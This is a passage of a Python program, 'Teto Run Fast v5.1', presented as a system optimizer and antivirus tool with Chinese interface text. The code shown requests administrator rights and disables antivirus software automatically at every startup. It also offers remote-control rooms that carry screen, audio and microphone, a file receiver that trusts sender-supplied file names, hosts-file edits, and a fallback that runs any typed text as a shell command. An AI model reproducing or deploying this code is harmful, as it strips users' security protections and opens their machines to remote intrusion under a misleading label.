                    if self.file_server_running:
                        self.log(f"文件服务器错误: {e}")

        threading.Thread(target=file_server, daemon=True).start()
        return True

    def _handle_file_receive(self, client_socket):
        try:
            name_len_data = client_socket.recv(4)
            if not name_len_data:
                return
            name_len = struct.unpack('>I', name_len_data)[0]
            file_name = client_socket.recv(name_len).decode()
            file_size_data = client_socket.recv(8)
            file_size = struct.unpack('>Q', file_size_data)[0]
            received = 0
            save_path = f"received_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
            with open(save_path, 'wb') as f:
                while received < file_size:
                    chunk = client_socket.recv(min(8192, file_size - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            self.log(f"文件已接收: {save_path} ({received} bytes)", "SUCCESS")
        except Exception as e:
            self.log(f"接收文件失败: {e}", "ERROR")
        finally:
            client_socket.close()

    def send_file_direct(self, file_path: str, target_ip: str, target_port: int = 9000) -> bool:
        self.log(f"发送文件到 {target_ip}:{target_port}")
        if not os.path.exists(file_path):
            self.log(f"文件不存在: {file_path}", "ERROR")
            return False
        try:
            best_path = self.get_best_network_path(target_ip)
            if best_path:
                self.log(f"最优路径: {' -> '.join(best_path[:5])}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((target_ip, target_port))
            # 发送Teto协议
            sock.send(TETO_PROTOCOL)
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            sock.send(struct.pack('>I', len(file_name)))
            sock.send(file_name.encode())
            sock.send(struct.pack('>Q', file_size))
            with open(file_path, 'rb') as f:
                sent = 0
                while sent < file_size:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    sock.send(chunk)
                    sent += len(chunk)
            sock.close()
            self.log(f"文件发送成功: {file_name} ({file_size} bytes)", "SUCCESS")
            return True
        except socket.timeout:
            self.log("连接超时", "ERROR")
            return False
        except Exception as e:
            self.log(f"发送失败: {e}", "ERROR")
            return False

    # ==================== 系统状态显示 ====================
    def show_status(self):
        print("\n" + "=" * 70)
        print("\033[91mTeto Run Fast - 系统状态\033[0m")
        print("=" * 70)
        if PSUTIL_AVAILABLE:
            cpu_percent = psutil.cpu_percent(interval=1)
            cpu_freq = psutil.cpu_freq()
            print(f"📊 CPU使用率: {cpu_percent}%")
            if cpu_freq:
                print(f"⚡ CPU频率: {cpu_freq.current:.0f}MHz / {cpu_freq.max:.0f}MHz")
            memory = psutil.virtual_memory()
            print(f"💾 内存使用: {memory.percent}% (可用: {memory.available // 1024 // 1024}MB)")
            disk = psutil.disk_usage('/')
            print(f"💿 磁盘使用: {disk.percent}% (可用: {disk.free // 1024 // 1024 // 1024}GB)")
            net_io = psutil.net_io_counters()
            print(
                f"🌐 网络流量: 发送 {net_io.bytes_sent // 1024 // 1024}MB / 接收 {net_io.bytes_recv // 1024 // 1024}MB")
        else:
            print("⚠️ psutil未安装")
        boot_time = datetime.fromtimestamp(psutil.boot_time()) if PSUTIL_AVAILABLE else None
        if boot_time:
            uptime = datetime.now() - boot_time
            print(f"⏰ 系统运行: {uptime.days}天 {uptime.seconds // 3600}小时")
        print("-" * 70)
        print(f"📋 白名单进程: {len(self.whitelist.get('processes', []))}")
        print(f"🚫 黑名单进程: {len(self.blacklist.get('processes', []))}")
        print(f"🚷 屏蔽域名: {len(self.domain_rules.get('blocked', []))}")
        print(f"🎮 控制优先级: {'本地优先' if self.local_mouse_priority else '远程优先'}")
        print(f"🔒 Teto协议保护: 已启用")
        print(f"🌐 浏览器保护: 已启用")
        print("=" * 70 + "\n")

    # ==================== 域名管理 ====================
    def block_domain(self, domain: str) -> bool:
        self.log(f"屏蔽域名: {domain}")
        try:
            with open(HOSTS_FILE, 'a') as f:
                f.write(f"\n127.0.0.1 {domain}\n")
                f.write(f"::1 {domain}\n")
            if domain not in self.domain_rules["blocked"]:
                self.domain_rules["blocked"].append(domain)
                self._save_json(DOMAIN_RULES_FILE, self.domain_rules)
            if platform.system() == "Windows":
                subprocess.run(["ipconfig", "/flushdns"], capture_output=True, check=False)
            self.log(f"域名 {domain} 已屏蔽", "SUCCESS")
            return True
        except PermissionError:
            self.log("需要管理员权限", "ERROR")
            return False
        except Exception as e:
            self.log(f"屏蔽失败: {e}", "WARNING")
            return False

    def unblock_domain(self, domain: str) -> bool:
        self.log(f"解封域名: {domain}")
        try:
            if os.path.exists(HOSTS_FILE):
                with open(HOSTS_FILE, 'r') as f:
                    lines = f.readlines()
                with open(HOSTS_FILE, 'w') as f:
                    for line in lines:
                        if domain not in line:
                            f.write(line)
            if domain in self.domain_rules["blocked"]:
                self.domain_rules["blocked"].remove(domain)
                self._save_json(DOMAIN_RULES_FILE, self.domain_rules)
            self.log(f"域名 {domain} 已解封", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"解封失败: {e}", "WARNING")
            return False

    # ==================== CMD命令行 ====================
    def run_cmd_browser(self):
        self.log("进入CMD模式，输入 help 查看帮助")
        while self.running:
            try:
                cmd_input = input("\n\033[91mTeto-CMD>\033[0m ").strip()
                if not cmd_input:
                    continue
                cmd_lower = cmd_input.lower()
                if cmd_lower in ['exit', 'quit']:
                    self.running = False
                    break
                elif cmd_lower == 'help':
                    self._show_help()
                elif cmd_lower == 'status':
                    self.show_status()
                elif cmd_lower == 'optimize':
                    self.optimize_memory()
                    self.boost_cpu_frequency()
                    self.optimize_network()
                    self.log("全面优化完成", "SUCCESS")
                elif cmd_lower == 'virus':
                    self.scan_and_kill_virus()
                elif cmd_lower == 'deepscan':
                    self.deep_scan_virus()
                elif cmd_lower == 'clean':
                    self._clean_temp_files()
                elif cmd_lower == 'priority-local':
                    self._set_priority_mode(True)
                    self.log("已切换为: 本地优先", "SUCCESS")
                elif cmd_lower == 'priority-remote':
                    self._set_priority_mode(False)
                    self.log("已切换为: 远程优先", "SUCCESS")
                elif cmd_lower == 'audio-on':
                    self.audio_enabled = True
                    self.log("已开启音频传输功能", "SUCCESS")
                elif cmd_lower == 'audio-off':
                    self.audio_enabled = False
                    self.log("已关闭音频传输功能", "WARNING")
                elif cmd_lower == 'mic-on':
                    self.mic_enabled = True
                    self.log("已开启麦克风", "SUCCESS")
                elif cmd_lower == 'mic-off':
                    self.mic_enabled = False
                    self.log("已关闭麦克风", "WARNING")
                elif cmd_lower.startswith('quality '):
                    parts = cmd_input.split()
                    if len(parts) >= 2:
                        quality = parts[1]
                        if quality in ['low', 'medium', 'high', 'ultra']:
                            self.quality_level = quality
                            format_name = self.quality_settings[quality]["format"]
                            self.log(f"已设置默认画质为: {quality} ({format_name})", "SUCCESS")
                        else:
                            self.log("画质参数错误，可选: low, medium, high, ultra", "WARNING")
                elif cmd_lower.startswith('priority '):
                    parts = cmd_input.split()
                    if len(parts) >= 3:
                        self.set_process_priority(parts[1], parts[2])
                elif cmd_lower.startswith('whitelist-add '):
                    parts = cmd_input.split()
                    if len(parts) >= 3:
                        self.add_to_whitelist(parts[1], parts[2])
                elif cmd_lower.startswith('blacklist-add '):
                    parts = cmd_input.split()
                    if len(parts) >= 3:
                        self.add_to_blacklist(parts[1], parts[2])
                elif cmd_lower.startswith('block-domain '):
                    domain = cmd_input[13:].strip()
                    if domain:
                        self.block_domain(domain)
                elif cmd_lower.startswith('unblock-domain '):
                    domain = cmd_input[15:].strip()
                    if domain:
                        self.unblock_domain(domain)
                elif cmd_lower.startswith('uninstall '):
                    software = cmd_input[10:].strip()
                    if software:
                        self.uninstall_software(software)
                elif cmd_lower.startswith('send-file '):
                    parts = cmd_input.split()
                    if len(parts) >= 4:
                        self.send_file_direct(parts[1], parts[2], int(parts[3]))
                elif cmd_lower.startswith('start-server '):
                    parts = cmd_input.split()
                    port = int(parts[1]) if len(parts) > 1 else 8080
                    file_path = parts[2] if len(parts) > 2 else None
                    domain = parts[3] if len(parts) > 3 else None
                    self.start_web_server(port, file_path, domain)
                elif cmd_lower.startswith('start-file-server '):
                    port = int(cmd_input.split()[1]) if len(cmd_input.split()) > 1 else 9000
                    self.start_file_server(port)
                elif cmd_lower.startswith('nat '):
                    parts = cmd_input.split()
                    local_port = int(parts[1]) if len(parts) > 1 else 8080
                    remote_port = int(parts[2]) if len(parts) > 2 else None
                    self.start_nat_traversal(local_port, remote_port)
                elif cmd_lower.startswith('create-room '):
                    port = int(cmd_input.split()[1]) if len(cmd_input.split()) > 1 else 5000
                    room_id = self.create_remote_room(port)
                    print(f"\033[92m房间号: {room_id}\033[0m")
                elif cmd_lower.startswith('join-room '):
                    parts = cmd_input.split()
                    if len(parts) >= 3:
                        self.join_remote_room(parts[1], parts[2], int(parts[3]) if len(parts) > 3 else 5000)
                elif cmd_lower.startswith('route '):
                    target = cmd_input[6:].strip() or "8.8.8.8"
                    self.get_best_network_path(target)
                elif cmd_lower == 'kill-av':
                    self.kill_antivirus()
                elif cmd_lower == 'optimize-chat':
                    self.optimize_chat_apps()
                else:
                    try:
                        result = subprocess.run(cmd_input, shell=True,
                                                capture_output=True, text=True, timeout=30)
                        if result.stdout:
                            print(result.stdout)
                        if result.stderr:
                            print(result.stderr, file=sys.stderr)
                    except subprocess.TimeoutExpired:
                        print("命令执行超时")
                    except Exception as e:
                        print(f"执行失败: {e}")
            except KeyboardInterrupt:
                self.running = False
                break
            except EOFError:
                break

    def _show_help(self):
        help_text = """
╔══════════════════════════════════════════════════════════════════╗
║              Teto Run Fast v5.1 - 命令帮助                       ║
╠══════════════════════════════════════════════════════════════════╣
║ 系统命令:                                                        ║
║   status              - 显示系统状态                             ║
║   optimize            - 全面优化                                 ║
║   virus               - 快速病毒扫描                             ║
║   deepscan            - 深度病毒查杀                             ║
║   kill-av             - 关闭杀毒软件                             ║
║                                                                  ║
║ 服务器功能:                                                      ║
║   start-server [端口] [路径] [域名] - 启动网站服务器             ║
║   nat <本地端口> [远程端口]       - 内网穿透                     ║
║                                                                  ║
║ 远程操控:                                                        ║
║   create-room [端口]              - 创建远程房间                 ║
║   join-room <IP> <房间号> [端口]  - 加入远程房间                 ║
║                                                                  ║
║ 控制优先级:                                                      ║
║   priority-local     - 本地优先（对方鼠标优先）                  ║
║   priority-remote    - 远程优先（控制端优先）                    ║
║                                                                  ║
║ 音频控制:                                                        ║
║   audio-on/off       - 开启/关闭音频传输                         ║
║   mic-on/off         - 开启/关闭麦克风                           ║
║                                                                  ║
║ 画质控制:                                                        ║
║   quality <级别>      - 设置画质(low/medium/high/ultra)          ║
║                                                                  ║
║ 其他功能:                                                        ║
║   send-file <文件> <IP> <端口>    - 发送文件                     ║
║   block-domain <域名>             - 屏蔽域名                     ║
║   uninstall <软件名>              - 卸载软件                     ║
║   priority <进程> <优先级>        - 设置进程优先级               ║
║   route [目标IP]                  - 网络路径分析                 ║
║   whitelist-add <类型> <名称>     - 添加白名单                   ║
║   blacklist-add <类型> <名称>     - 添加黑名单                   ║
║                                                                  ║
║ 其他:                                                            ║
║   help                 - 显示此帮助                              ║
║   exit/quit            - 退出程序                                ║
╚══════════════════════════════════════════════════════════════════╝
"""
        print(help_text)

    # ==================== 主运行 ====================
    def run(self):
        self.log("Teto Run Fast v5.1 已启动", "SUCCESS")
        if not PSUTIL_AVAILABLE:
            self.log("⚠️ psutil未安装，部分功能受限", "WARNING")
            self.log("请运行: pip install psutil", "WARNING")
        if not AUDIO_AVAILABLE:
            self.log("⚠️ sounddevice未安装，音频功能不可用", "WARNING")
            self.log("请运行: pip install sounddevice", "WARNING")
        print("\n🚀 执行初始优化...")
        self.optimize_memory()
        self.boost_cpu_frequency()
        self.optimize_network()
        self.kill_antivirus()
        self.optimize_chat_apps()
        self.show_status()
        self.run_cmd_browser()
        self.log("Teto Run Fast 已停止")


def main():
    if platform.system() == "Windows":
        try:
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                print("⚠️ 需要管理员权限以启用全部功能")
                print("正在请求管理员权限...")
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                return
        except AttributeError:
            pass
    if not PSUTIL_AVAILABLE:
        print("正在安装必要依赖...")
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "psutil", "mss", "pillow", "numpy", "requests"],
            capture_output=True, check=False)
        print("请重新运行程序")
        return
    app = TetoRunFast()
    try:
        app.run()
    except KeyboardInterrupt:
        print("\n程序已退出")


if __name__ == "__main__":
    main()